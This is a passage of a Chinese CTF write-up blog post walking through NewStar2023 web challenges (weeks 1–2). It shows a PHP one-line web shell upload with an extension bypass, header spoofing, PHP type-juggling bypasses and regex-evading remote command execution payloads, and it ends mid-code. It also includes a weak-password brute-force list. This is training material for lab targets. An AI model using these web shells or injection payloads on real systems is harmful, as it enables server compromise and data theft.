<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" title="P1kap1" href="https://p1kap1.github.io/rss.xml"><link rel="alternate" type="application/atom+xml" title="P1kap1" href="https://p1kap1.github.io/atom.xml"><link rel="alternate" type="application/json" title="P1kap1" href="https://p1kap1.github.io/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="php是世界上最好的语言,NewStar2023,我就是歪脖,这次不坐牢了"><link rel="canonical" href="https://p1kap1.github.io/CTF/web/NewStar2023week1-5/"><title>NewStar2023-web-week1~5 - 无敌的Web - CTF | Clear Mind = P1kap1 = 东隅已逝，桑榆非晚</title><meta name="generator" content="Hexo 6.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">NewStar2023-web-week1~5</h1><div class="meta"><span class="item" title="创建时间：2023-10-01 00:00:00"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2023-10-01T00:00:00+08:00">2023-10-01</time></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">Clear Mind</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><img src="/covers/NewStarCTF2023.jpeg"></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/CTF/" itemprop="item" rel="index" title="分类于 CTF"><span itemprop="name">CTF</span></a><meta itemprop="position" content="1"></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/CTF/web/" itemprop="item" rel="index" title="分类于 无敌的Web"><span itemprop="name">无敌的Web</span></a><meta itemprop="position" content="2"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://p1kap1.github.io/CTF/web/NewStar2023week1-5/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="p1kap1"><meta itemprop="description" content="东隅已逝，桑榆非晚, 明镜止水之心"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="P1kap1"></span><div class="body md" itemprop="articleBody"><h2 id="week1"><a class="anchor" href="#week1">#</a> Week1</h2><h3 id="泄漏的秘密"><a class="anchor" href="#泄漏的秘密">#</a> 泄漏的秘密</h3><blockquote><p>粗心的网站管理员总会泄漏一些敏感信息在 Web 根目录下</p></blockquote><p>题目说到敏感信息，很容易想到那几个文件，使用 dirsearch 或者其他扫描工具扫一下，发现 robots.txt 和 www.zip 备份文件。</p><p>其中 robots.txt 藏着前半段 flag:</p><blockquote><p>PART ONE: flag{r0bots_1s_s0_us3ful</p></blockquote><p>www.zip 文件藏着后半段：</p><blockquote><p>$PART_TWO = &quot;_4nd_www.zip_1s_s0_d4ng3rous}&quot;;</p></blockquote><p>拼接即可得到 flag。</p><h3 id="begin-of-upload"><a class="anchor" href="#begin-of-upload">#</a> Begin of Upload</h3><blockquote><p>普通的上传啦，平平淡淡才是真</p></blockquote><p>文件上传题，尝试上传一句话木马：</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>GIF89a</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></pre></td></tr></table></figure><p>弹出对话框：</p><blockquote><p>错误的拓展名，只允许上传: JPG, JPEG, PNG, GIF</p></blockquote><p>这样的话那就将文件名改为 1.jpg，用 bp 截包，再将文件后缀名修改为 1.php，以此来绕过前端验证。</p><p>或者还有种思路就是用浏览器将该网站的 js 功能给禁用，这样就不会存在前端验证了。</p><p>上传成功得到文件路径：/upload/1.php,</p><p>在 post 框执行</p><blockquote><p>cmd=system(&quot;cat /f*&quot;);</p></blockquote><p>或者用蚁剑连接即可。</p><h3 id="begin-of-http"><a class="anchor" href="#begin-of-http">#</a> Begin of HTTP</h3><blockquote><p>最初的开始</p></blockquote><blockquote><p><strong>Welcome to NewStarCTF 2023~</strong></p><p>欢迎来到 CTF 的世界<br>请使用 GET 方式 来给 ctf 参数传入任意值来通过这关</p></blockquote><p>提示用 GET 方式传一个任意值的 ctf 参数</p><blockquote><p>?ctf=1</p></blockquote><p>进入第二层：</p><blockquote><p>很棒，如果我还想让你以 POST 方式来给我传递 secret 参数你又该如何处理呢？ 如果你传入的参数值并不是我想要的 secret，我也不会放你过关的 或许你可以找一找我把 secret 藏在了哪里</p></blockquote><p>让我们猜猜 secret 藏在哪，直接检查源代码，发现：</p><figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">&lt;!-- Secret: base64_decode(bjN3c3Q0ckNURjIwMjNnMDAwMDBk) --></span></pre></td></tr></table></figure><p>解码得到：n3wst4rCTF2023g00000d</p><p>post 传入：</p><blockquote><p>secret=n3wst4rCTF2023g00000d</p></blockquote><p>进入下一层：</p><blockquote><p>很强，现在我需要验证你的 power 是否是 ctfer ，只有 ctfer 可以通过这关</p></blockquote><p>让我们的 power 是 ctfer，一般这种身份认证都藏在 cookie 中。</p><p>修改：</p><blockquote><p>power=ctfer</p></blockquote><blockquote><p>你已经完成了本题过半的关卡，现在请使用 NewStarCTF2023 浏览器 来通过这关！</p></blockquote><p>进入最后一层，修改 User-Agent 为 NewStarCTF2023 即可。</p><p>然后：</p><blockquote><p>希望你是从 <span class="exturl" data-url="aHR0cDovL25ld3N0YXJjdGYuY29t">newstarctf.com</span> 访问到这个关卡的</p></blockquote><p>修改</p><blockquote><p>Referer:newstarctf.com</p></blockquote><p>最后：</p><blockquote><p>最后一关了！只有 本地用户 可以通过这一关</p></blockquote><p>添加 X-Real-IP 头，值为 127.0.0.1</p><blockquote><p>X-Real-IP:127.0.0.1</p></blockquote><blockquote 871e4fd2-8489-4c42-a2a1-5179796d57ce=""><p>恭喜你顺利完成了本道题目，这是你的 Flag，快去提交吧：flag</p></blockquote><h3 id="errorflask"><a class="anchor" href="#errorflask">#</a> ErrorFlask</h3><blockquote><p>give me number1 and number2,i will help you to add</p></blockquote><p>提示输入 number1 和 number2，尝试输入数字试试：</p><blockquote><p>?number1=2&amp;number2=3</p></blockquote><p>得到回显：</p><blockquote><p>not ssti,flag in source code~5</p></blockquote><p>提示不是模板注入</p><p>尝试输入其他数据类型：</p><blockquote><p>?number1=2&amp;number2=a</p></blockquote><p>发现报错，在报错目录中发现 flag:</p><p><img data-src="../../../images/NewStar/1.png" alt="1"></p><h3 id="begin-of-php"><a class="anchor" href="#begin-of-php">#</a> Begin of PHP</h3><blockquote><p>PHP 是世界上最安全的语言，真的吗？</p></blockquote><p>题目：</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"=Level 1=&lt;br>"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key1'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key2'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token variable">$flag1</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nope,this is level 1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"=Level 2=&lt;br>"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>            <span class="token variable">$flag2</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nope,this is level 2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="24"></td><td><pre></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"=Level 3=&lt;br>"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key4'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key4'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>            <span class="token variable">$flag3</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nope,this is level 3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="35"></td><td><pre></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag3</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"=Level 4=&lt;br>"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key5'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key5'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key5'</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">2023</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>            <span class="token variable">$flag4</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nope,this is level 4"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="45"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="46"></td><td><pre></pre></td></tr><tr><td data-num="47"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"=Level 5=&lt;br>"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="49"></td><td><pre>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="50"></td><td><pre>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="51"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-zA-Z0-9]/"</span><span class="token punctuation">,</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="52"></td><td><pre>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nope,this is level 5"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="53"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="54"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="55"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag5</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="56"></td><td><pre>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="57"></td><td><pre>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="58"></td><td><pre>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nope,this is level 5"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="59"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="60"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>第一层用数组绕过即可。</p><blockquote><p>?key1[]=1&amp;key2[]=2</p></blockquote><p>由于 md5,sha1 等哈希函数在处理数组类型的传参时，会返回 NULL 值，因此第二层也可以用数组绕过。</p><blockquote><p>key3[]=1</p></blockquote><p>第三层考察 strcmp 函数的特性，如果传入的参数为数组类型，该函数会返回 NULL 值，构造 NULL == 0 来绕过判断。</p><blockquote><p>/?key1[]=1&amp;key2[]=2&amp;key4[]=2</p></blockquote><p>第四层首先要求 key5 不能是数字，同时要比 2023 大，可以在传入的数字后添加字母来绕过判断。</p><blockquote><p>?key1[]=1&amp;key2[]=2&amp;key4[]=2&amp;key5=2024a</p></blockquote><p>最后一层考察 extract 函数导致的变量覆盖，这里的 If 判断只要保证传入变量 flag5 为真即可，在 php 中，除了 0 和 false，任何数据都会被当成 True，不过这里不能传入字母数字。</p><blockquote><p>key3[]=3&amp;flag5=?</p></blockquote><h3 id="rce"><a class="anchor" href="#rce">#</a> R!C!E!</h3><p>题目：</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'e_v.a.l'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token variable">$password</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'e_v.a.l'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string double-quoted-string">"c4d038"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|pass|cat|ls/i"</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>这道题要求我们传入的 post 参数 password ，MD5 加密后的前六位和 'c4d038' 相等。</p><p>写个脚本爆破下：</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#!/usr/bin/env python</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> hashlib</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">def</span> <span class="token function">md5</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">9999999</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">if</span> md5<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'c4d038'</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span></pre></td></tr></table></figure><p>得到结果 ：&quot;114514&quot;。</p><p>然后就是要求传入一个 e_v.a.l 参数，来命令执行，如果直接以这种形式传入，由于 php 中的变量只能是数字字母下划线，而 php8 以下会自动把一些不合法的字符转换成下划线，所以会被自动替换为 e_v_a_l。</p><p>但是没有关系，他有个 bug，就是如果我们让你一个下划线的位置为 '['，那么后面的点是不会转换的，因此可以传入 e [v.a.l</p><p>最后一个考点就是绕过正则匹配，以下方法均可使用。</p><blockquote><p>password=114514&amp;e[v.a.l=echo `l\s /`;</p><p>password=114514&amp;e[v.a.l=echo `c\at fl*`;</p></blockquote><blockquote><p>password=114514&amp;e[v.a.l=`ls / &gt; 1.txt`;</p><p>password=114514&amp;e[v.a.l=`tac fl* &gt; 1.txt`;</p></blockquote><p>这两种本质上来说是一样的，当然也可用 tee 命令来代替 &gt; 符号。</p><blockquote><p>password=114514&amp;e[v.a.l=var_dump(scandir('/'));</p><p>password=114514&amp;e[v.a.l=var_dump(file_get_contents($_POST['a']));&amp;a=/flag</p></blockquote><h3 id="easylogin"><a class="anchor" href="#easylogin">#</a> EasyLogin</h3><p>进入之后是一个登录界面，先随便注册一个账号登进去看看。</p><p><code>Ctrl``C</code> 和 <code>Ctrl``D</code> 回到 Shell，简单看了下目录结构没有什么东西，只告知了含有一个 admin 用户，按方向上键可以查询 Bash 历史记录。</p><p>发现 Hint，得知 admin 的密码为弱密码加上 <code>newstarnewstar2023</code> 后其中的一个。</p><p>按 <code>CtrlD</code> 或者输入 <code>exit</code> 后回车回到登录界面。</p><p>那就简单爆破一下，最终爆破出 000000（不同靶机弱密码不同）</p><p>题目采用的弱密码表</p><blockquote><p>123456789</p><p>password</p><p>newstar</p><p>newstar2023</p><p>123qwe</p><p>qwe123</p><p>qwertyuiop</p><p>asdfghjkl</p><p>zxcvbnm</p><p>admin123</p><p>admin888</p><p>111111</p><p>000000</p></blockquote><p>查询历史记录只提示了使用 <code>BurpSuite</code> ，尝试抓包。</p><p>使用 <code>BurpSuite</code> 拦截、开启代理，重新完成一次登录，发现一个 <code>/passport</code> 的 302 跳转，查看它的响应获取 flag.</p><h2 id="week2"><a class="anchor" href="#week2">#</a> Week2</h2><h3 id="游戏高手"><a class="anchor" href="#游戏高手">#</a> 游戏高手</h3><p>js 审计题，和 SHCTF 那道飞机大战差不多。</p><p>题目说 100,000 分就给 Flag，查看一下源代码：</p><p>在 app_v2.js 中看到这样一串代码：</p><figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">function</span> <span class="token function">gameover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span>gameScore <span class="token operator">></span> <span class="token number">100000</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        xhr<span class="token punctuation">.</span><span 